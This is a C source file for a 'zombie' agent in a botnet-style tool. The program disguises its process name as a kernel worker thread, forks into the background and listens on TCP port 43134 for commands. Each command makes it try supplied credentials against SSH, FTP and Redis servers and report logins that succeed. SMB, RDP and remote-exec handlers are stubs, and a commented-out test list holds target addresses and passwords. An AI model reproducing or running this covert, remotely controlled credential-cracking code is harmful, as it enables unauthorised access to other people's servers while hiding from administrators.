//gcc zombie.c -lssh -lpthread -o zombie_client
//clear; rm -rf zombie.c ; nano zombie.c ; gcc zombie.c -lssh -lpthread -o zombie_client; ./a.out
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h> 
#include <netinet/in.h>      //structure sockaddr_in
#include <arpa/inet.h>       //Func : htonl; htons; ntohl; ntohs
#include <assert.h>          //Func :assert
#include <unistd.h>          //Func :close,write,read
#include <regex.h>
#include <libssh/libssh.h>
#include <pthread.h>
#include<fcntl.h>
#include <sys/ioctl.h>
#include <signal.h> 

#define SOCKET_MAX_LENGTH 1024
#define RESULT_MAX_LENGTH 1024
#define CHARS_NAME_LENGTH 64
#define IP_MAX_LENGTH 20
#define PORT_MAX_CHAR_LENGTH 5

#define TIME_OUT_TIME 0.5
#define AGENT_PORT 43134
#define BUFFER_LENGTH 1024
#define MAX_CONN_LIMIT 512 
#define NUM_MAX_RETRIES 3

#define RTUN_SUCCESS1 0
#define RTUN_SUCCESS2 1
#define RTUN_INPUT_WRONG 2
#define RTUN_REGEX_WRONG 3
#define RTUN_UNREACHABLE 4
#define RTUN_SERVICE_WRONG 5
#define PARENTNAME      "[kworker/3:1]"

//linux unsupport regex in lookaround
#define IP_REGX "((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\\.){3}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])"
#define PORT_REGX "(:[1-5][0-9]{4}/)|(:6[0-4][0-9]{3}/)|(:65[0-4][0-9]{2}/)|(:655[0-2][0-9]{1}/)|(:6553[0-5]/)|(:[1-9][0-9]{0,3}/)"
#define USER_REGX "user=(\\w*)\\&"
#define PWD_LENGTH_REGX "&passwd=[0-9]{0,2}:"

int32_t verbose = 0;
int32_t debug = 0;
int32_t src_port = 0;
int32_t ssh_cracker(char *, char *);
int32_t ftp_cracker(char *, char *);
int32_t redis_cracker(char *, char *);
int32_t smb_cracker(char *, char *);
int32_t rdp_cracker(char *, char *);
int32_t do_custom_work(char *, char *);
int32_t commit_suicide(char *, char *);
int32_t get_ip(char *, char *);
int32_t get_port(char *);
int32_t get_pwd(char *, char *);
int32_t get_user(char *, char *);
int32_t getcmd(char *, char *);

typedef int32_t (*pfunc)(char *,char*);
pfunc p_func[]={
    ssh_cracker,
    ftp_cracker,
    redis_cracker,
    smb_cracker,
    rdp_cracker,
    do_custom_work,
    commit_suicide
};

char p_srv[][CHARS_NAME_LENGTH]={
    "ssh",
    "ftp",
    "redis",
    "smb",
    "rdp",
    "custom",
    "kill"
};

int32_t regmatch_items(char *payload, char *matched_str, char *REGX_EXPRESSION){
    char ebuff[256]={0};
    int32_t ret,i,len=0;
    int32_t cflags;
    regex_t reg;
    regmatch_t subs[SOCKET_MAX_LENGTH];
    cflags = REG_EXTENDED | REG_ICASE ;

    ret = regcomp(&reg, REGX_EXPRESSION, cflags);
    if (ret)
    {
        regerror(ret, &reg, ebuff, 256);
        fprintf(stderr, "[Err] %s\n", ebuff);
        matched_str[len] = '\0';
        goto end;
    }

    ret = regexec(&reg, payload, SOCKET_MAX_LENGTH, subs, 0);
    if (ret)
    {
        regerror(ret, &reg, ebuff, 256);
        fprintf(stderr, "[Err] %s\n", ebuff);
        matched_str[len] = '\0';
        goto end;
    }

    //regerror(ret, &reg, ebuff, 256);
    //fprintf(stderr, "result is:%s\n", ebuff);
    len = subs[0].rm_eo - subs[0].rm_so;
    memcpy(matched_str, payload + subs[0].rm_so, len);
    matched_str[len] = '\0';
end:
    regfree(&reg);
    return strlen(matched_str);
}

int32_t get_srv_type(char *payload){
    int32_t count=0;
    for(;count<sizeof(p_srv)/sizeof(*p_srv);count++){
        if(!strncmp(payload, p_srv[count], strlen(p_srv[count]))){
            break;
        }
    }
    return count;
}

int32_t get_ip(char *payload, char *result){
    char matched_result[CHARS_NAME_LENGTH]={0};
    int32_t matched_length = 0;
    matched_length = regmatch_items(payload,matched_result,IP_REGX);
    // ":8901/"
    if(matched_length > CHARS_NAME_LENGTH || matched_length <= 0){
        if (verbose || debug) fprintf(stderr, "[Err] regex-expression found noting!\n");
        return -1;
    }
    // "8901"
    memcpy(result, matched_result, matched_length);
    result[matched_length] = '\0';
    if (debug) printf("[Debug]target ip is %s\n", result);
    return strlen(result);
}

int32_t get_port(char *payload){
    char matched_result[CHARS_NAME_LENGTH]={0};
    int32_t matched_length = 0;
    matched_length = regmatch_items(payload,matched_result,PORT_REGX);
    // ":8901/"
    if(matched_length > CHARS_NAME_LENGTH || matched_length <= 0){
        if (verbose || debug) fprintf(stderr, "[Err] regex-expression found noting!\n");
        return -1;
    }
    // "8901"
    matched_result[matched_length - 1] = '\0';
    if (debug) printf("[Debug] port number is %d\n", atoi(matched_result+1));
    if(atoi(matched_result+1) > 65535) return -1;
    return atoi(matched_result+1);
}

int32_t get_user(char *payload, char *result){
    char matched_result[CHARS_NAME_LENGTH]={0};
    int32_t matched_length = 0;
    matched_length = regmatch_items(payload,matched_result,USER_REGX);
    // "user=root&"
    if(matched_length > CHARS_NAME_LENGTH || matched_length <= 0){
        if (verbose || debug) fprintf(stderr, "[Err] regex-expression found noting!\n");
        return -1;
    }
    // "root"
    memcpy(result, matched_result + 5, matched_length - 2);
    result[matched_length - 6] = '\0';
    if (debug) printf("[Debug] username is %s\n", result);
    return 0;
}

int32_t get_passwd_length(char *payload, char *result){
    char matched_result[CHARS_NAME_LENGTH]={0};
    int32_t matched_length = 0;
    matched_length = regmatch_items(payload,matched_result,PWD_LENGTH_REGX);
    // &passwd=8:
    if(matched_length > CHARS_NAME_LENGTH || matched_length <= 0){
        if (verbose || debug) fprintf(stderr, "[Err] regex-expression found noting!\n");
        return -1;
    }
    // "8"
    memcpy(result, matched_result + 8, matched_length - 2);
    result[matched_length - 9] = '\0';
    matched_result[matched_length - 2] = '\0';
	if (debug) printf("[Debug] passwd's length is %d\n",atoi(result));
    return atoi(result);
}

int32_t get_passwd(char *payload, char *result){
    char matched_result[CHARS_NAME_LENGTH]={0};
    char *pcursor = NULL;
    int32_t pass_len = 0;
    char str_pwdlen[CHARS_NAME_LENGTH]={0};
    // &passwd=8:`*password*`
    pcursor = strstr(payload, "&passwd=");
    if(!pcursor) return -1;
    // `*password*`
    pcursor = strstr(pcursor, ":`*");
    if(!pcursor) return -1;
    pcursor+=3;
    // password*`
    pass_len = get_passwd_length(payload, str_pwdlen);
    if(pass_len < 0) 
        return -1;
    memcpy(result, pcursor, pass_len);
    // password
    if (debug) printf("[Debug] passwd is <\"%s\">\n",result);
    result[pass_len] = '\0';
    return 0;
}

//#include <libssh/libssh.h>
int32_t sshsrv_connector(char *ip, int32_t port, char *user, char *pwd) {
    int32_t auth_state = 0, timeout = 1;
    ssh_session session = NULL;

    ssh_init();
    session = ssh_new();
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_HOST, ip);
    ssh_options_set(session, SSH_OPTIONS_USER, user);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(session, SSH_OPTIONS_COMPRESSION_C_S, "none");
    ssh_options_set(session, SSH_OPTIONS_COMPRESSION_S_C, "none");
    if (ssh_connect(session) != 0) {
        if (verbose || debug) fprintf(stderr, "[Err] timeout!\n");
        goto err;
    }
    auth_state = ssh_userauth_none(session, NULL);
    if(auth_state == SSH_AUTH_ERROR){
        goto err;
    }

    if(auth_state == SSH_AUTH_SUCCESS){
        if (verbose || debug) printf("[success] connect directly!\n");
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return 2;
    }

    auth_state = ssh_auth_list(session);
    /*
    #define SSH_AUTH_METHOD_UNKNOWN     0x0000u
    #define SSH_AUTH_METHOD_NONE        0x0001u
    #define SSH_AUTH_METHOD_PASSWORD    0x0002u
    #define SSH_AUTH_METHOD_PUBLICKEY   0x0004u
    #define SSH_AUTH_METHOD_HOSTBASED   0x0008u
    #define SSH_AUTH_METHOD_INTERACTIVE 0x0010u
    #define SSH_AUTH_METHOD_GSSAPI_MIC  0x0020u
    */
    if ((auth_state & SSH_AUTH_METHOD_PASSWORD) > 0){
        auth_state = ssh_userauth_password(session, NULL, pwd);
    }else{
        if (verbose || debug) fprintf(stderr, "[Err] SSH auth_method wrong!\n");
        goto err;
    }
    /*
    enum ssh_auth_e {
        SSH_AUTH_SUCCESS=0,
        SSH_AUTH_DENIED,
        SSH_AUTH_PARTIAL,
        SSH_AUTH_INFO,
        SSH_AUTH_AGAIN,
        SSH_AUTH_ERROR=-1
    };
    */
    if (auth_state == SSH_AUTH_SUCCESS || auth_state == SSH_AUTH_PARTIAL) {
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return 0;
    }
    if (verbose || debug) fprintf(stderr,"[Err] Authentication failure\n");
err:
    ssh_disconnect(session);
    ssh_finalize();
    ssh_free(session);
    return 1;

}

int32_t ftpsrv_connector(int32_t s, char *user, char *passwd) {
    char buf2send[SOCKET_MAX_LENGTH];
    char buf2recv[SOCKET_MAX_LENGTH];

    recv(s, buf2recv, SOCKET_MAX_LENGTH, 0);
    if(buf2recv[0] != '2' ){
        if (verbose || debug) fprintf(stderr, "[Err] wrong service type!\n");
        return 4;
    }
    //send username
    sprintf(buf2send, "USER %.250s\r\n", user);
    send(s, buf2send, strlen(buf2send), 0);
    recv(s, buf2recv, SOCKET_MAX_LENGTH, 0);
    if (buf2recv[0] == '5' && buf2recv[1] == '3' && buf2recv[2] == '0') {
        if (verbose || debug) fprintf(stderr, "[Err] user %s does not exist!\n", user);
        return 2;
    }
    // for some server deal with anonymous access
    if (buf2recv[0] == '2') {
        if (verbose || debug) printf("[success] ftpsrv anonymous authentication!\n");
        return 1;
    }
    if (buf2recv[0] != '3') {
        if (buf2recv) {
            if (verbose || debug)
                fprintf(stderr, "[Err] abnormal protocol status \n");
        }
        return 4;
    }

    //send password
    sprintf(buf2send, "PASS %.250s\r\n", passwd);
    send(s, buf2send, strlen(buf2send), 0);
    recv(s, buf2recv, SOCKET_MAX_LENGTH, 0);

    if (buf2recv[0] == '2') {
        if (verbose || debug) printf("[success] ftpsrv passwd:<\"%s\">\n", passwd);
            return 0;
    }
    return 3;
}

int32_t redissrv_connector(int32_t s, char *passwd) {
    char buf2send[SOCKET_MAX_LENGTH] = {0};
    char buf2recv[SOCKET_MAX_LENGTH] = {0};
    char tmp_len[SOCKET_MAX_LENGTH] = {0};
    //send passwd
    if(strlen(passwd)){
        sprintf(tmp_len, "%d", strlen(passwd));
        sprintf(buf2send, "*2\r\n$4\r\nAUTH\r\n$%.50s\r\n%.250s\r\n", tmp_len, passwd);
    }else{
        sprintf(buf2send, "*1\r\n$4\r\nping\r\n");
    }
    send(s, buf2send, strlen(buf2send), 0);
    if (verbose || debug) printf("[Info] %s\n", buf2send);
    recv(s, buf2recv, SOCKET_MAX_LENGTH, 0);

    if (buf2recv[0] == '+' ) {
        if(strstr(buf2recv, "+PONG") != NULL){
            if (verbose || debug) printf("[Success] empty passwd!\n");
            return 1;
        }else{
            if (verbose || debug) printf("[Success] redis passwd:%s!\n", passwd);
            return 0;
        }
    }
    if (buf2recv[0] == '-' ) {
        if (verbose || debug) printf("[Debug] redis wrong passwd!\n");
        return 2;
    } else {
        if (verbose || debug) fprintf(stderr, "[Err] wrong service type!\n");
        return 3;
    }

    return 1;
}

int32_t ssh_cracker(char *payload, char *result){
    char target_ip[IP_MAX_LENGTH]={0};
    int32_t target_port=0;
    char target_user[CHARS_NAME_LENGTH]={0};
    char target_passwd[CHARS_NAME_LENGTH]={0};
    int32_t ret = 0;

    ret|=get_ip(payload,target_ip);
    target_port=get_port(payload);
    ret|=get_user(payload,target_user);
    ret|=get_passwd(payload,target_passwd);
    if(ret < 0 || target_port < 0) return 1;

    ret = sshsrv_connector(target_ip ,target_port, target_user, target_passwd);
    if(ret == 0){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{success:ssh@%s %s}\n",target_user, target_passwd);
        if(verbose||debug) printf("%s",result);
        return 0;
    }
    if(ret == 2){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{success:ssh@%s  %s}\n",target_user, "*");
        if(verbose||debug) printf("%s",result);
        return 0;
    }
	(void)snprintf(result,RESULT_MAX_LENGTH,"{error:authentication failure}\n");
    return 1;
}

int32_t ftp_cracker(char *payload, char *result){
    char target_ip[IP_MAX_LENGTH]={0};
    int32_t target_port=0;
    char target_user[CHARS_NAME_LENGTH]={0};
    char target_passwd[CHARS_NAME_LENGTH]={0};
    int32_t ret = 0, count = 0, flags = 0;
    struct timeval tv;
    tv.tv_sec = TIME_OUT_TIME;
    tv.tv_usec = 0;
    fd_set set;
    unsigned long ul = 1;
    struct sockaddr_in s_addr_local;
    struct sockaddr_in s_addr_target;
    memset(&s_addr_local,0,sizeof(s_addr_local));
    s_addr_local.sin_family = AF_INET;
    s_addr_local.sin_addr.s_addr = htonl(INADDR_ANY);
    s_addr_local.sin_port = htons(src_port);
    int32_t sockfd_local = socket(AF_INET,SOCK_STREAM,0);
    int32_t sockfd_target; 
    int32_t server_length = sizeof(s_addr_target); 

    ret|=get_ip(payload, target_ip);
    target_port=get_port(payload);
    ret|=get_user(payload, target_user);
    ret|=get_passwd(payload, target_passwd);
    if(ret < 0 || target_port < 0) return -1;

    if(bind(sockfd_local,(struct sockaddr *)(&s_addr_local),sizeof(s_addr_local))==-1){
        fprintf(stderr,"[Err] ftp_cracker socket bind failure!\n");
        return -1;
    }

    memset(&s_addr_target,0,sizeof(s_addr_target));
    s_addr_target.sin_family = AF_INET;
    s_addr_target.sin_addr.s_addr = inet_addr(target_ip);
    s_addr_target.sin_port = htons(target_port);

    ioctl(sockfd_local, FIONBIO, &ul);
    do {
        ret = connect(sockfd_local, (struct sockaddr *)&s_addr_target, sizeof(s_addr_target));
        if(ret == -1){
            FD_ZERO(&set);
            FD_SET(sockfd_local, &set);
            if( select(sockfd_local+1, NULL, &set, NULL, &tv) <= 0){
                ret = -1;
                fprintf(stderr, "[Err] connection timeout!\n");
            }
        }
        count++;
    } while (count < NUM_MAX_RETRIES && ret < 0);
    ul = 0;
    ioctl(sockfd_local, FIONBIO, &ul);
    if(count >= NUM_MAX_RETRIES && ret < 0){
        close(sockfd_local);
        (void)snprintf(result, RESULT_MAX_LENGTH, "{error:host unreachable}\n");
        return 0;
    }
    ret = ftpsrv_connector(sockfd_local, target_user, target_passwd);
    close(sockfd_local);
    if(ret == 0){
        (void)snprintf(result, RESULT_MAX_LENGTH, "{success:ftp@%s %s}\n",target_user, target_passwd);
        return 0;
    }
    if(ret == 1){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{success:ftp_anno}\n");
        return 0;
    }
    if(ret == 2){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{error:Authentication failure}\n");
        return 1;
    }
    if(ret == 3){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{error:Authentication failure}\n");
        return 1;
    }
    if(ret == 4){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{error:service wrong}\n");
        return 0;
    }
    return 1;
}

int32_t redis_cracker(char *payload, char *result){
    char target_ip[IP_MAX_LENGTH]={0};
    int32_t target_port=0;

    char target_passwd[CHARS_NAME_LENGTH]={0};
    int32_t ret = 0, count = 0, flags = 0;
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    fd_set set;
    unsigned long ul = 1;
    struct sockaddr_in s_addr_local;
    struct sockaddr_in s_addr_target;
    memset(&s_addr_local,0,sizeof(s_addr_local));
    s_addr_local.sin_family = AF_INET;
    s_addr_local.sin_addr.s_addr = htonl(INADDR_ANY);
    s_addr_local.sin_port = htons(src_port);
    int32_t sockfd_local = socket(AF_INET,SOCK_STREAM,0);
    int32_t sockfd_target; 
    int32_t server_length = sizeof(s_addr_target);

    ret|=get_ip(payload, target_ip);
    target_port=get_port(payload);

    ret|=get_passwd(payload, target_passwd);
    if(ret < 0 || target_port < 0) return -1;

    if(bind(sockfd_local,(struct sockaddr *)(&s_addr_local),sizeof(s_addr_local))==-1){
        fprintf(stderr,"[error]socket bind!\n");
        return -1;
    }

    memset(&s_addr_target,0,sizeof(s_addr_target));
    s_addr_target.sin_family = AF_INET;
    s_addr_target.sin_addr.s_addr = inet_addr(target_ip);
    s_addr_target.sin_port = htons(target_port);

    ioctl(sockfd_local, FIONBIO, &ul);
    do {
        ret = connect(sockfd_local, (struct sockaddr *)&s_addr_target, sizeof(s_addr_target));
        if(ret == -1){
            FD_ZERO(&set);
            FD_SET(sockfd_local, &set);
            if( select(sockfd_local+1, NULL, &set, NULL, &tv) <= 0){
                ret = -1;
                if(verbose || debug) fprintf(stderr, "[Err] timeout!\n");
            }
        }
        count++;
    } while (count < NUM_MAX_RETRIES && ret < 0);
    ul = 0;
    ioctl(sockfd_local, FIONBIO, &ul);
    if(count >= NUM_MAX_RETRIES && ret < 0){
        close(sockfd_local);
        (void)snprintf(result, RESULT_MAX_LENGTH, "{error:host unreachable}\n");
        return 0;
    }
    ret = redissrv_connector(sockfd_local, target_passwd);
    close(sockfd_local);
    if(ret == 0){
        (void)snprintf(result, RESULT_MAX_LENGTH, "{success:redis passwd:%s}\n", target_passwd);
        return 0;
    }
    if(ret == 1){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{success:redis authless}\n");
        return 0;
    }
    if(ret == 2){
        (void)snprintf(result,RESULT_MAX_LENGTH,"{error:Authentication failure}\n");
        return 1;
    }

    (void)snprintf(result,RESULT_MAX_LENGTH,"{error:service wrong}\n");
    return 0;
}

int32_t smb_cracker(char *payload, char *result){
    printf("[stub] smb_cracker\n");
    char target_ip[IP_MAX_LENGTH]={0};
    int32_t target_port=0;
    char target_user[CHARS_NAME_LENGTH]={0};
    char target_passwd[CHARS_NAME_LENGTH]={0};
    int32_t length = 0;

    length = get_ip(payload,target_ip);
    target_port=get_port(payload);
    length = get_user(payload,target_user);
    length = get_passwd(payload,target_passwd);
    printf("smb://%s:%d/user=%s&passwd=%s\n", target_ip ,target_port, target_user, target_passwd);

    strcpy(result,"{success:smb:root:passwd}");
    return 0;
}

int32_t rdp_cracker(char *payload, char *result){
    printf("[stub] rdp_cracker\n");
    char target_ip[IP_MAX_LENGTH]={0};
    int32_t target_port=0;
    char target_user[CHARS_NAME_LENGTH]={0};
    char target_passwd[CHARS_NAME_LENGTH]={0};
    int32_t length = 0;

    length = get_ip(payload,target_ip);
    target_port=get_port(payload);
    length = get_user(payload,target_user);
    length = get_passwd(payload,target_passwd);
    printf("rdp://%s:%d/user=%s&passwd=%s\n", target_ip ,target_port, target_user, target_passwd);

    strcpy(result,"{success:rdp:root:passwd}");
    return 0;
}

int32_t do_custom_work(char *payload, char *result){
    printf("[stub] do_custom_work\n");
	//do something here
    strcpy(result,"{success:exec done}");
    return 0;
}

int32_t commit_suicide(char *payload, char *result){
    printf("[stub] commit_suicide\n");
	strcpy(result,"{success:googdbye}");
    exit(0);
    return 0;
}



int32_t process(char *payload, char *result, int32_t (*fun)(char *, char *)){
    int32_t ret = (*fun)(payload, result);
    return ret;
}

int32_t do_task(char *payload, char *result){

    int32_t ret = 0;
    int32_t srv_type = get_srv_type(payload);
    printf("-----------------------------\n");
	printf("[Payload]:%s\n", payload);
    if(srv_type >= sizeof(p_srv)/sizeof(*p_srv)){
        if(verbose) printf("[Info] unknown srv_type!\n");
        return -1;
    }

    if(process(payload, result, p_func[srv_type])){
        if(verbose) printf("[Info] authentication failure!\n");
        return -2;
    }
	printf("---> %s", result);
    //alert types:strange status/ success status.
    //return "{status:result_string}";
    return 0;
}

void send_result(int32_t fd, char *result){
    int32_t count=3;
    while(count>0){
        if(write(fd,result,strlen(result)) != -1)
        {
            break;
        }
        count--;
    }
}

static void zombie_handle(void * sock_fd){
    int32_t fd = *((int32_t *)sock_fd);
    int32_t i_recvBytes;
    char data_recv[SOCKET_MAX_LENGTH];
    char data_send[SOCKET_MAX_LENGTH];
    printf("waiting for request...\n");
    while(1){

        memset(data_recv,0,BUFFER_LENGTH);
		memset(data_send,0,BUFFER_LENGTH);
        i_recvBytes = read(fd,data_recv,BUFFER_LENGTH);
        if(i_recvBytes == 0 || strncmp(data_recv,"quit",4)==0){
            break;
        }
        if(i_recvBytes == -1){
            fprintf(stderr,"[Err] zombie read error!\n");
            break;
        }
		(void)do_task(data_recv, data_send);
        send_result(fd, data_send);
/*
        if(do_task(data_recv, data_send) != -1){
            send_result(fd, data_send);
        }
*/

    }
    //Clear
    printf("terminating...\n");
    close(fd);
}

void start_agent(){

    struct sockaddr_in s_addr_local;
    struct sockaddr_in s_addr_remote;
    memset(&s_addr_local,0,sizeof(s_addr_local));
    s_addr_local.sin_family = AF_INET;
    s_addr_local.sin_addr.s_addr = htonl(INADDR_ANY);
    s_addr_local.sin_port = htons(AGENT_PORT);

    int32_t sockfd_local = socket(AF_INET,SOCK_STREAM,0);
    int32_t sockfd_remote; 
    int32_t server_length = sizeof(s_addr_remote);;

    if(bind(sockfd_local,(struct sockaddr *)(&s_addr_local),sizeof(s_addr_local))==-1){
        fprintf(stderr,"[Err] zombie socket bind!\n");
        exit(1);
    }
    if(listen(sockfd_local,MAX_CONN_LIMIT) == -1)
    {
        fprintf(stderr,"[Err] zombie socket listen!\n");
        exit(1);
    }

    while(1){
        pthread_t thread_id;
        sockfd_remote = accept(sockfd_local,(struct sockaddr *)(&s_addr_remote),(socklen_t *)(&server_length));
        if(sockfd_remote == -1)
        {
            fprintf(stderr,"[Err] zombie socket accept!\n");
            //continue;
        }
        if(pthread_create(&thread_id,NULL,(void *)(&zombie_handle),(void *)(&sockfd_remote)) == -1)
        {
            fprintf(stderr,"[Err] zombie pthread_create!\n");
            break;
        }
    }
}

int32_t main(int argc, char *argv[]){

    // 修改进程名并放到后台，参考@droberson的icmp-backdoor项目。thx,a lot :)
    if (strlen(argv[0]) >= strlen(PARENTNAME)) {
        memset(argv[0], '\0', strlen(argv[0]));
        strcpy(argv[0], PARENTNAME);
    }
    signal(SIGCHLD, SIG_IGN);
	if (fork() == 0) start_agent();


//test_function_mode start
/*
    char result[SOCKET_MAX_LENGTH];
    char payload[][100] = {
        "ftp://170.170.64.78:21/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.78:22/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.7822/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.7822:/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.7822:1111111/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.782", 
        "ftp://170.170.64.78:21/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.78:21:1111111/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.78:22:1111111/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.78:22:21/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.78:22:21", 
        "ft", 
        "", 
        "  ftp://170.170.64.78:21/user=anonymous&passwd=0:`**`", 
        "ssh://192.170.64.79:22/user=anonymous&passwd=0:`**`",
        "redis://170.170.64.78:6379/user=ss&passwd=6:`*123456*`", 
        "redis://170.170.64.78:6380/user=&passwd=0:`**`",
        "redis://192.170.64.80:22/user=&passwd=0:`**`", 
        "ftp://192.170.64.79:21/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.79:21/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.78:26/uftp&passwd=4:`*uftp*`", 
        "ftp://170.170.64.78:26/user=uftp&passwd=4:`*uftp*`", 
        "ftp://170.170.64.78:26/user=uftp&passwd=4:`*uftp1*`", 
        "ftp://170.170.64.78:26/user=uftp&passwd=45:`*uftp1*`", 
        "ftp://170.170.64.78:21/user=anonymous&passwd=0:`**`", 
        "ftp://170.170.64.78:21/user=anonymous1&passwd=0:`**`", 
        "ftp://170.170.64.78:21/user=&passwd=0:`**`", 
        "ftp://170.170.64.78:21/user=&pas", 
        "ftp://170.170.64.78:21/user=anonymous&passwd=4:`*toor*`", 
        "ftp://170.170.64.78:21/user=kali&passwd=4:`*kali*`", 
        "ftp://170.170.64.78:21/user=kali&passwd=5:`**`", 
        "ftp://170.170.64.78:21/user=kali&passwd=5", 
        "ftp://170.170.64.78:21/user=kali&passwd=5:`*666666666*`", 
        "ssh://170.170.64.78:22/user=root&passwd=4:`*toor*`", 
        "redis://170.170.64.78:6380/user=ss&passwd=0:`**`", 
        "redis://170.170.64.78:6379/user=ss&passwd=6:`*123456*`", 
        "redis://170.170.64.78:6379/user=&passwd=6:`*123456xsc*`", 
        "redis://170.170.64.78:6380/user=&passwd=6:`*123456xsc*`", 
        "redis://170.170.64.78:6380/user=&passwd=6:`**`", 
        "redis://170.170.64.78:6380/user=&passwd=0:`**`", 
        "redis://170.170.64.78:6380/user=&passwd=`**`"
    };

    int32_t count = 0;
    for (;count<(sizeof(payload)/sizeof(*payload));count++){
        (void)do_task(*(payload+count), result);
        sleep(1);
    }
//test_function_mode end
    return 0;
*/
}
